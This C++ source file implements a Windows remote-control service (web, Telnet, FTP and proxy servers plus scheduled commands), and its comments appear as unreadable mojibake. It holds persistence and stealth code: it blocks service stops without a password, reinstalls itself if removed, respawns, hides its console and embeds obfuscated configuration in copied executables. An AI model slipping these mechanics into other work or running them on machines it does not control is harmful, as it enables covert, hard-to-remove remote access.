/*******************************************************************
   *	rmtsvc.cpp
   *    DESCRIPTION: rmtsvcԶ�̿��ƹ���
   *
   *******************************************************************/

#include "rmtsvc.h"
const char * MyService :: ServiceVers="2.5.2 (build110105)";
static const char * sServiceName="rmtsvc";
static const char * sServiceDesc="Remote Control Service";

static std::string g_cfgfile;//���ò����ļ���
MyService :: MyService(LPCTSTR ServiceName, LPCTSTR ServiceDesc)
:CNTService(ServiceName,NULL)
{
	m_lpServiceDesc=ServiceDesc;
	m_hStop=NULL;
	m_hStopEvent=NULL;
	//�ı�����Ĭ�����ͣ���������潻��
	m_dwServiceType|=SERVICE_INTERACTIVE_PROCESS;
	m_bSpyself=true;//�Ƿ���������쳣�˳�
	m_bFaceless=false; //Ĭ��˫�����г����Ƿ񲻴�����̨����
}

//����ֹͣ���봴��stopEvent�¼�
void MyService :: CreateStopEvent(const char *stop_pswd)
{//�ڷ���ģʽ�´����Ķ����ܱ�application��debugģʽ������
//��˱���ı䴴��event����ķ���Ȩ�ޣ��Ա�application�ܹ����ʴ��¼�
	if(stop_pswd==NULL || stop_pswd[0]==0) return;
	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	sa.lpSecurityDescriptor = &sd;
	::InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);	
	//����һ���յİ�ȫ��������Ϊ����ʹ�����������ܷ��ʡ�
	::SetSecurityDescriptorDacl(&sd, TRUE, (PACL)NULL, FALSE);
	std::string strStopswd(m_lpServiceName); strStopswd.append(stop_pswd);
	int nlen=cCoder::Base64EncodeSize(strStopswd.length());
	char *tmpbuf=new char[nlen+1];//BASE64����
	if(tmpbuf==NULL) return;
	nlen=cCoder::base64_encode((char *)strStopswd.c_str(),strStopswd.length(),tmpbuf);
	tmpbuf[nlen]=0;
	m_hStopEvent = ::CreateEvent(&sa, TRUE, FALSE, tmpbuf);
	delete[] tmpbuf; return; 
}
void MyService :: SetStopEvent(const char *stop_pswd)
{
	if(stop_pswd==NULL || stop_pswd[0]==0) return;
	std::string strStopswd(m_lpServiceName); strStopswd.append(stop_pswd);
	int nlen=cCoder::Base64EncodeSize(strStopswd.length());
	char *tmpbuf=new char[nlen+1];//BASE64����
	if(tmpbuf==NULL) return;
	nlen=cCoder::base64_encode((char *)strStopswd.c_str(),strStopswd.length(),tmpbuf);
	tmpbuf[nlen]=0;
	HANDLE hStopEvent = ::OpenEvent(EVENT_MODIFY_STATE, TRUE, tmpbuf);
	if(hStopEvent){ ::SetEvent(hStopEvent); ::CloseHandle(hStopEvent); }
	delete[] tmpbuf; return; 
}

void MyService :: Stop_Request() //����ֹͣ�����¼�
{	
	if(m_hStopEvent && WaitForSingleObject(m_hStopEvent, 100) != WAIT_OBJECT_0)
		return; //�����������SERVICE_ACCEPT_STOP
	m_dwControlsAccepted |=SERVICE_ACCEPT_STOP;
	ReportStatus(SERVICE_RUNNING);
}
void MyService :: Stop() //����ֹͣ�¼�
{	
	if( m_hStop ) SetEvent(m_hStop);
	m_hSockEvent.Close();
	ReportStatus(SERVICE_STOP_PENDING,3000); 
}
void MyService :: Shutdown() //ϵͳ�ػ�����
{
	if( m_hStop ) SetEvent(m_hStop);
	m_hSockEvent.Close();
	ReportStatus(SERVICE_STOP_PENDING,3000);
	return;
}

//-----------------------------------------------------------------------

#define MAX_SAVEEXE_PARAMLENGTH 4096
long fileparam_flags=0x31323334;//�ļ�ĩβ�Ĳ�����ʼ��־
//�ӱ��ļ�ĩβ������������
bool readParamfromfile(std::string &strret,const char *strexefile)
{
	char modalname[MAX_PATH]; char *pbuf=NULL;
	if(strexefile==NULL)
		::GetModuleFileName( NULL, modalname, MAX_PATH-1);
	else strcpy(modalname,strexefile);
	FILE *fp=fopen(modalname,"rb");
	if(fp==NULL) return false;
	//�������ò����ĳ��ȣ���������־�ַ��ͱ��򳤶�
	::fseek(fp,0-sizeof(long),SEEK_END);
	::fread((void *)modalname,sizeof(long),1,fp);
	for(int i=0;i<sizeof(long);i++)
		modalname[i]^=*( (char *)&fileparam_flags+i );
	long paramlen=*((long *)modalname); //��ȡ��������
	bool b=false;
	if(paramlen<=MAX_SAVEEXE_PARAMLENGTH && paramlen>0)
	{
		::fseek(fp,0-paramlen-sizeof(long)-sizeof(fileparam_flags),SEEK_END);
		::fread((void *)modalname,sizeof(fileparam_flags),1,fp);
		b=(*((long *)modalname)==fileparam_flags);
	}
	if( !b || (pbuf=new char[paramlen+1])==NULL )
	{
		::fclose(fp); return false;
	}
	paramlen=::fread((void *)pbuf,sizeof(char),paramlen,fp);
	pbuf[paramlen]=0;
	//�Ⱥͱ�־�������ֽ����
	for(i=0;i<paramlen;i++)
		pbuf[i]^=*( (char *)&fileparam_flags+i%sizeof(fileparam_flags) );
	//��ʱ�õ�����һ��base64������ַ���,�Ƚ���base64����
	paramlen=cCoder::base64_decode(pbuf,paramlen,pbuf);
	pbuf[paramlen]=0; strret.append(pbuf);
	delete[] pbuf;
	::fclose(fp); return true;
}
//��ָ���Ĳ�������д�뵽ָ��exe��ĩβ
bool writeParamintofile(const char *strexefile,const char *param,long paramlen)
{
	if(param==NULL || paramlen<=0)
	{
		RW_LOG_PRINT(LOGLEVEL_ERROR,0,"wrong param to write.\r\n");
		return false;
	}
	FILE *fp=::fopen(strexefile,"ab");
	if(fp==NULL)
	{
		RW_LOG_PRINT(LOGLEVEL_ERROR,"failed to open %s for writing.\r\n",strexefile);
		return false;
	}
	//���ܱ���Ҫд��Ĳ���
	int buflen=cCoder::Base64EncodeSize(paramlen)+sizeof(long)+sizeof(fileparam_flags);
	char *pbuf=new char[buflen];
	if(pbuf==NULL){ ::fclose(fp); return false; }
	char *pstart=pbuf;
	memcpy((void *)pstart,(const void *)&fileparam_flags,sizeof(fileparam_flags));
	pstart+=sizeof(fileparam_flags);
	paramlen=cCoder::base64_encode((char *)param,paramlen,pstart);
	for(int i=0;i<paramlen;i++)
		pstart[i]^=*( (char *)&fileparam_flags+i%sizeof(fileparam_flags) );
	pstart+=paramlen;
	for(i=0;i<sizeof(long);i++)
		pstart[i]=*((char *)&paramlen+i) ^ *((char *)&fileparam_flags+i);
	//�ܹ�Ҫ׷��д����ֽڴ�С
	paramlen+=sizeof(long)+sizeof(fileparam_flags);
	
	//-------------------
	char buffer[8];
	::fseek(fp,0-sizeof(long),SEEK_END);
	::fread((void *)buffer,sizeof(long),1,fp);
	for(i=0;i<sizeof(long);i++)
		buffer[i]^=*( (char *)&fileparam_flags+i );
	long datalen=*((long *)buffer); //��ȡ��������
	if(datalen<=MAX_SAVEEXE_PARAMLENGTH && datalen>0)
	{
		::fseek(fp,0-datalen-sizeof(long)-sizeof(fileparam_flags),SEEK_END);
		::fread((void *)buffer,sizeof(fileparam_flags),1,fp);
	}
	else *((long *)buffer)=~fileparam_flags;
	if(*((long *)buffer)==fileparam_flags)
		::fseek(fp,0-datalen-sizeof(long)-sizeof(fileparam_flags),SEEK_END);
	else
		::fseek(fp,0,SEEK_END);
	::fwrite(pbuf,sizeof(char),paramlen,fp);
	::fclose(fp); delete[] pbuf;
	return true;
}

//�����µ�exe�ļ�
bool saveAsExe(std::string &saveasfile)
{
	if(saveasfile=="") return false;
	bool ifNo_ini=false;
	const char *ptr_saveasfile=saveasfile.c_str();
	if(saveasfile[0]=='*'){ifNo_ini=true; ptr_saveasfile+=1;}
	FILE *fp=::fopen(g_cfgfile.c_str(),"rb");
	if(fp){
		::fseek(fp,0,SEEK_END);
		long filelen=::ftell(fp);
		if(filelen<MAX_SAVEEXE_PARAMLENGTH)
		{
			::fseek(fp,0,SEEK_SET);
			char buf[MAX_SAVEEXE_PARAMLENGTH+1];
			int l=(ifNo_ini)?sprintf(buf,"No-ini\r\n"):0;
			filelen=::fread(buf+l,sizeof(char),filelen,fp)+l;
			buf[filelen]=0;

			char modalname[MAX_PATH]; //�����ļ�
			::GetModuleFileName( NULL, modalname, MAX_PATH-1);
			if(::CopyFile(modalname,ptr_saveasfile,FALSE))
			{
				if(writeParamintofile(ptr_saveasfile,buf,filelen))
					RW_LOG_PRINT(LOGLEVEL_ERROR,"success to saving as %s.\r\n",ptr_saveasfile);
				else
					RW_LOG_PRINT(LOGLEVEL_ERROR,"failed to saving as %s.\r\n",ptr_saveasfile);
			}else RW_LOG_PRINT(LOGLEVEL_ERROR,0,"failed to create New copy\r\n");
		}else
			RW_LOG_PRINT(LOGLEVEL_ERROR,"failed to saving as %s,saving param too long(max %d)\r\n"
					,ptr_saveasfile,MAX_SAVEEXE_PARAMLENGTH);
		::fclose(fp); return true;
	}//?if(fp)
	else RW_LOG_PRINT(LOGLEVEL_ERROR,"failed to saving as %s.\r\n",ptr_saveasfile);
	return false;
}

#define NEXT_ARG ((((*Argv)[2])==TEXT('\0'))?(--Argc,*++Argv):(*Argv)+2)
#define NEXT_ARG_E ((--Argc,*++Argv))
void MyService :: Run(DWORD argc, LPTSTR *argv)
{
	// report to the SCM that we're about to start
	ReportStatus(SERVICE_START_PENDING);
	//����Ĭ����־�������ΪLOGLEVEL_INFO
	RW_LOG_SETLOGLEVEL(LOGLEVEL_INFO);
	
	bool bReadedIni=false; //�û��Ƿ����ini��������
	//��ȡexe��������ò��� start----------------------------
	std::string strParam;
	if(bReadedIni=readParamfromfile(strParam,NULL))
	{//����exe�����������Ϣ
		const char *pstart=strParam.c_str();
		const char *ptr=strchr(pstart,'\r');
		while(true){
			if(ptr) *(char *)ptr=0;
			//����Ӧ�ó���Ҫ��ȡ�����ļ�
			if(strcmp(pstart,"No-ini")==0) g_cfgfile="";
			if(pstart[0]!='!') //������ע����
				parseCommand(pstart); //����������pstart��������
			if(ptr==NULL) break;
			*(char *)ptr='\r'; pstart=ptr+1;
			if(*pstart=='\n') pstart++;
			ptr=strchr(pstart,'\r');
		}//?while
	}//?if(readParamfromfile(strParam,NULL))
	//��ȡexe��������ò���  end ----------------------------
	//��ȡ�����ļ���Ϣ start---------------------------------
	FILE *fp=(g_cfgfile=="")?NULL:(::fopen(g_cfgfile.c_str(),"r"));
	if(fp){
		char sline[1024]; bReadedIni=true;
		while( ::fgets(sline,1024,fp) ){
			if(sline[0]!='!'){ //������ע����
				int len=strlen(sline); len--;
				while(len>=0 &&(sline[len]=='\n' || sline[len]=='\r')) sline[len--]=0;
				parseCommand(sline); //����������sline��������
			}
		}//?while( ::fgets(sline,1024,fp)
		::fclose(fp);
	}//?if(fp)
	//��ȡ�����ļ���Ϣ  end ---------------------------------
	//��ȡ�����в���-----------------------------------------
	DWORD Argc;  LPTSTR * Argv;
	#ifdef UNICODE
		Argv = CommandLineToArgvW(GetCommandLineW(), &Argc );
	#else
		Argc = (DWORD) argc; Argv = argv;
	#endif
	if(Argc>0){
	while( ++Argv, --Argc ) {
		if( Argv[0][0] == TEXT('-') ) {
			switch( Argv[0][1] ) {
				case TEXT('d'):	// debug the service
					m_bFaceless=false;
					if(Argv[0][2]>='0' && Argv[0][2]<='4') 
						RW_LOG_SETLOGLEVEL((LOGLEVEL)('4'-Argv[0][2]));
					break;
//*********************�û��������� statrt ****************************************
//*********************�û���������  end  ****************************************
			}//?switch( Argv[0][1] ) 
		}//?if( Argv[0][0] == TEXT('-') ) 
	}//?while( ++Argv, --Argc )
	}//?if(Argc>0){	
	//��ȡ�����в���------------------------------------------
	if(!m_bDebug) m_bFaceless=true;//����ģʽ����,û�п���̨����
	//���û�п���̨��ָ�����������̨��ȡ�����
	if(m_bFaceless) ::FreeConsole();
	if(m_bFaceless){ if(RW_LOG_LOGTYPE()==LOGTYPE_STDOUT) RW_LOG_SETNONE();}
	else RW_LOG_OUTSTDOUT(true);//����п���̨������ͬ�����������̨
	//����ֹͣ�����¼�
	m_hStop = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	if(m_hStop==NULL){
		RW_LOG_PRINT(LOGLEVEL_ERROR,0,"[Fatal] Can not create Event object.\r\n");
		ReportStatus(SERVICE_STOPPED,3000,0); return;
	}
	if(m_bDebug && m_hStopEvent){ ::CloseHandle(m_hStopEvent); m_hStopEvent=NULL; }
	//�Ƿ��ֹͨ������ֹ̨ͣ����
	if(m_hStopEvent) m_dwControlsAccepted &=(~SERVICE_ACCEPT_STOP); // ��ֹ����STOP�¼�
	ReportStatus(SERVICE_START_PENDING);
	
	//����ʼ����------------------------------
	if(RW_LOG_CHECK(LOGLEVEL_INFO)) RW_LOG_PRINTTIME(); //��ӡ��ʼ����ʱ��
	if(m_bSpyself) //���������쳣�˳�����
	{
		char commandline[MAX_PATH]; int len=0;
		if(!m_bDebug) len=sprintf(commandline," -s");
		for(int i=1;i<argc;i++)
			len+=sprintf(commandline+len," %s",argv[i]);
		commandline[len]=0; AutoSpy(commandline);
	} RW_LOG_PRINT(LOGLEVEL_INFO,0,"program starting up.\r\n");
//*********************�û��������� start ****************************************	
	if(!m_websvr.Start()) //����web����
		RW_LOG_PRINT(LOGLEVEL_ERROR,"Can not start WWW server(%d).\r\n",m_websvr.m_svrport);
	if(!m_telsvr.Start()) //����Telnet����
		RW_LOG_PRINT(LOGLEVEL_ERROR,"Can not start Telnet server(%d).\r\n",m_telsvr.m_svrport);
	
	m_ftpsvr.readIni(); //��ȡ������FTP�������Ϣ
	m_proxysvr.readIni(); //��ȡ�����ô���������Ϣ
	m_vidcManager.readIni(); //��ȡ������vIDC����Ϣ
	if(m_vidcManager.m_upnp.upnpinfo().size()>0) m_vidcManager.m_upnp.Search(); //����UPnP�豸
	if(m_ftpsvr.m_settings.autoStart)
	{
		if(!m_ftpsvr.Start()) //����FTP����
			RW_LOG_PRINT(LOGLEVEL_ERROR,"Can not start FTP server(%d).\r\n",m_ftpsvr.m_settings.svrport);
	}
	if(m_proxysvr.m_settings.autorun)
	{
		if(!m_proxysvr.Start()) //�����������
			RW_LOG_PRINT(LOGLEVEL_ERROR,"Can not start Proxy server(%d).\r\n",m_proxysvr.m_settings.svrport);
	}
	if(m_vidcManager.m_vidcsvr.m_autorun)
	{
		if(m_vidcManager.m_vidcsvr.Start()<=0)
			RW_LOG_PRINT(LOGLEVEL_ERROR,"Can not start vIDC server(%d).\r\n",m_vidcManager.m_vidcsvr.m_svrport);
	}
	m_vidcManager.mtcpl_Start();
	DWORD dwCount_vidcc=1;	//,dwCount_msnbot=1; //yyc remove MSN 2010-11-05
	//�û�˫����ʱ�����ĳ�����û������ini������web���������ˣ��������ʷ�ʽ����Ĭ������IE
	if(!bReadedIni && !m_bFaceless && m_websvr.status()==SOCKS_LISTEN){
		char execmd[128]; 
		sprintf(execmd,"exec -shell http://127.0.0.1:%d/",m_websvr.getLocalPort());
		parseCommand(execmd);
	}//?if(!bReadedIni && !m_bFaceless)
//*********************�û���������  end  ****************************************
	ReportStatus(SERVICE_RUNNING);
	time_t tStartTime=time(NULL); 
	//�ȴ��������
	while( WaitForSingleObject(m_hStop, 1000) != WAIT_OBJECT_0 )
	{
//*********************�û��������� start ****************************************
		/* //yyc remove MSN 2010-11-05
		if(!m_msnbot.ifSigned() && --dwCount_msnbot==0 )
		{
			if(!m_msnbot.signin()){
				dwCount_msnbot=60; //��һ�γ�����һ���Ӻ����
				int err=m_msnbot.getLastErrorCode();
				//��¼ʧ�ܣ�������������ԭ����ɵ�
				if(err==SOCKSERR_OK) NULL;//û������MSN�ʺ�
				else if( err==SOCKSERR_MSN_EMAIL) //��¼ʧ�ܣ���Ч���ʺŻ�����
					RW_LOG_PRINT(LOGLEVEL_ERROR,0,"Can not signin MSN server,invalid account or password.\r\n");
				else
					RW_LOG_PRINT(LOGLEVEL_WARN,0,"program will signin 1 minutes later.\r\n");
			}else dwCount_msnbot=1;
		}//?if(!m_msnbot.ifSigned()) */ //yyc remove MSN 2010-11-05

		//����������Զ�����Զ��vIDCs�����Ⲣ�Զ�����
		if(--dwCount_vidcc==0){ dwCount_vidcc=10; m_vidcManager.m_vidccSets.autoConnect();}
//*********************�û���������  end  ****************************************
		if(m_tasklist.size()>0)
		{//����ʱִ�������б�
			time_t tNow=time(NULL);
			struct tm * ltime=localtime(&tNow);
			for(int i=0;i<m_tasklist.size();i++)
			{
				TaskTimer &task=m_tasklist[i];
				std::string sTask=task.strTask;
				if(task.type=='t' && task.h>0)//ָ�����ִ��
				{	
					if(task.flag==0) task.flag=tStartTime;
					if( (tNow-task.flag)>=task.h )
						task.flag=tNow,parseCommand(sTask.c_str());
				}else if(task.type=='d'){ //ÿ�춨ʱִ��
					if(task.h==ltime->tm_hour && task.m==ltime->tm_min)
					{	
						if(task.flag==0) //�Ƿ��ִ�д˶�ʱ����
							task.flag=1,parseCommand(sTask.c_str());
					}else task.flag=0; //����ִ�д˶�ʱ����
				}
			}//?for(int i=0;i<m_tasklist.size();i++)
		}//?if(m_tasklist.size()>0)
	}//while
	
	if(RW_LOG_CHECK(LOGLEVEL_INFO)) RW_LOG_PRINTTIME(); //��ӡ��������ʱ��
	RW_LOG_PRINT(LOGLEVEL_INFO,0,"Stopping program,please waiting...\r\n");
	RW_LOG_FFLUSH();
//*********************�û��������� start ****************************************
	m_ftpsvr.saveIni();   //����ftp�����������Ϣ
	m_proxysvr.saveIni();
	m_vidcManager.saveIni(); //��������vIDC����Ϣ
	m_vidcManager.Destroy(); //ֹͣvidc��ط��������ͷ������Դ
	m_ftpsvr.Stop(); //ֹͣFTP����
	m_proxysvr.Stop();
	m_websvr.Stop();
	m_telsvr.Stop();
//	m_msnbot.signout();//�˳���¼  //yyc remove MSN 2010-11-05
//*********************�û���������  end  ****************************************

	if(RW_LOG_CHECK(LOGLEVEL_INFO)) RW_LOG_PRINTTIME(); //��ӡ��������ʱ��
	RW_LOG_PRINT(LOGLEVEL_INFO,0,"program end!\r\n");
	//������������뱣�����˳�ʱ���������Ƿ�װ����
	if(m_hStopEvent)
	{
		QUERY_SERVICE_CONFIG sc;
		if( !GetServiceConfig(&sc) ) InstallService(); //������ܱ�ɾ���ˣ����°�װ
		else if(sc.dwStartType!=m_dwStartType || sc.dwServiceType!=m_dwServiceType) 
			SetServiceConfig();//��������״̬���޸���
	}//?if(m_hStopEvent)
	//�����Ѿ�����------------------------------
	if(m_hStop) ::CloseHandle(m_hStop); //����/�����˳�
	if(m_hStopEvent) ::CloseHandle(m_hStopEvent); //����/�����˳�
	ReportStatus(SERVICE_STOPPED,3000,0); 
}

//��ע����/д��������
void delreg(const char *svrkey)
{
	HKEY  hKEY;
	LPCTSTR lpRegPath = "Software\\Microsoft\\Windows\\CurrentVersion";
	if(::RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRegPath, 0, KEY_WRITE|KEY_READ, &hKEY)==ERROR_SUCCESS)
	{
		::RegDeleteValue(hKEY,svrkey);
		::RegCloseKey(hKEY);
	}
	return;
}
bool regsvrname(const char *svrkey, std::string &svrname,bool bWrite)
{
	HKEY  hKEY; bool bret=false;
	LPCTSTR lpRegPath = "Software\\Microsoft\\Windows\\CurrentVersion";
	if(::RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRegPath, 0, KEY_WRITE|KEY_READ, &hKEY)==ERROR_SUCCESS){
		if(bWrite){
				if( ::RegSetValueEx(hKEY, svrkey, NULL,REG_SZ, (LPBYTE)svrname.c_str(),svrname.length()+1)== ERROR_SUCCESS) bret=true;
		}
		else{
			char buf[64]; DWORD retLen=64;
			DWORD dwType=REG_SZ;
			if(::RegQueryValueEx(hKEY, svrkey, NULL,&dwType,(unsigned char *)buf,&retLen)==ERROR_SUCCESS){
				buf[retLen]=0; 
				svrname.assign(buf); bret=true;
			}
		}
		::RegCloseKey(hKEY);
	}
	if(!bret) svrname=(bWrite)?"":svrkey;
	return bret;
}
bool getDefaultCfgfile(std::string &cfgfile)
{
	char buf[MAX_PATH];
	DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH);
	buf[dwret]=0;
	const char *ptr=strrchr(buf,'.');
	cfgfile.assign(buf,ptr-buf);
	cfgfile.append(".ini");
	return true;
}
void getDefaultSvrname(std::string &svrname)
{
	char buf[MAX_PATH];
	DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH);
	buf[dwret]=0;
	const char *ptr=strrchr(buf,'\\');
	if(ptr) svrname.assign(ptr+1); else svrname.assign(buf);
	if( (ptr=strrchr(svrname.c_str(),'.')) )
		svrname.erase(ptr-svrname.c_str());
	if(svrname=="") svrname.assign(sServiceName);
	return;
}
//��һ�����·����ת��Ϊһ������·����
void getAbsolutfilepath(std::string &spath)
{
	if(spath!="" && spath[1]==':') return; //������һ������·��
	char buf[MAX_PATH];
	DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH);
	buf[dwret]=0; 
	const char *ptr=strrchr(buf,'\\');
	if(ptr==NULL) return;
	*(char *)(ptr+1)=0;
	spath.insert(0,buf); return;
}
//ɾ�����������ʱ�ļ�
void delUpdateTmpfile()
{
	char buf[MAX_PATH];
	DWORD dwret=::GetModuleFileName(NULL,buf,MAX_PATH-6);
	strcpy(buf+dwret,".tmp"); buf[dwret+4]=0;
	::DeleteFile(buf);
}
//�����в���
//-i dsplatName serverDesc --- ��װ����
//-u ---ж�ط���
//-s --- ��������
//-e --- ֹͣ����
//-d --- Debug��ʽ����
//-n serverName ---- ָ����װ���������
//		�����ͨ��-nָ����װ�ķ������ƣ���Ĭ�ϵķ�������Ϊ��ִ���ļ���������Ϊָ��������
//		ָ���˰�װ�������ƣ�������¼��װ�ķ�������ע�����ִ���ļ���Ϊkeyֵ
//-c saveasfile --- ����ǰini���ò���д��exe�ļ��������Ϊָ�����ļ�
//-C saveasfile --- ����ǰini���ò���д��exe�ļ��������Ϊָ�����ļ�,
//					ͬʱ��������exe���򽫲�֧��ini�����ļ�
//-f filename ָ��������������ļ���,�����ָ����Ĭ�ϲ��������ļ���Ϊ�ͳ���ͬ������չ��Ϊini���ļ�
int main(int argc, char* argv[])
{
	std::string saveasfile;
	std::string svrname,svrkey;
	getDefaultSvrname(svrkey);
	char *ptr_stoppswd=NULL; //ֹͣ��������
	for(int i=1;i<argc;i++){
		if(strcmp(argv[i],"-n")==0){
			if(i<(argc-1) && argv[i+1][0]!='-'){
				svrname.assign(argv[i+1]); 
				regsvrname(svrkey.c_str(),svrname,true); 
			}
		}else if(strcmp(argv[i],"-f")==0){
			if(i<(argc-1) && argv[i+1][0]!='-') g_cfgfile.assign(argv[i+1]);
		}else if(strcmp(argv[i],"-u")==0)
			delreg(svrkey.c_str());
		else if(strcmp(argv[i],"-e")==0)
		{
			if(i<(argc-1) && argv[i+1][0]!='-') ptr_stoppswd=argv[i+1];
		}else if(strcasecmp(argv[i],"-c")==0)
		{
			if(i<(argc-1) && argv[i+1][0]!='-')
			{
				if(argv[i][1]=='C') saveasfile.assign("*");
				saveasfile.append(argv[i+1]);
			}else printf("Error param : -c/C new_filename\r\n");
		}
		//*********************�û��������� start ****************************************
		//*********************�û���������  end  ****************************************
	}//?for(int i=1;i<argc;i++){
	if(svrname=="") regsvrname(svrkey.c_str(),svrname,false);
	//�����ļ�����Ĭ��Ϊexeͬ�ļ�����ini�ļ�
	if(g_cfgfile=="") 
		getDefaultCfgfile(g_cfgfile);
	else //����û�����������·�������Է���ʽ����ʱ�����Ҳ��������ļ�
		getAbsolutfilepath(g_cfgfile);
	//������д�룬���Ϊ�µ�exe 
	if(saveasfile!=""){ saveAsExe(saveasfile); return 0; }
	delUpdateTmpfile();//ɾ�����������ʱ�ļ�
	MyService serv(svrname.c_str(),sServiceDesc);
	//������ֹͣ��������,���Դ�����ֹͣ����
	if(ptr_stoppswd) serv.SetStopEvent(ptr_stoppswd);
	serv.RegisterService(argc, argv);
	return 0;
}
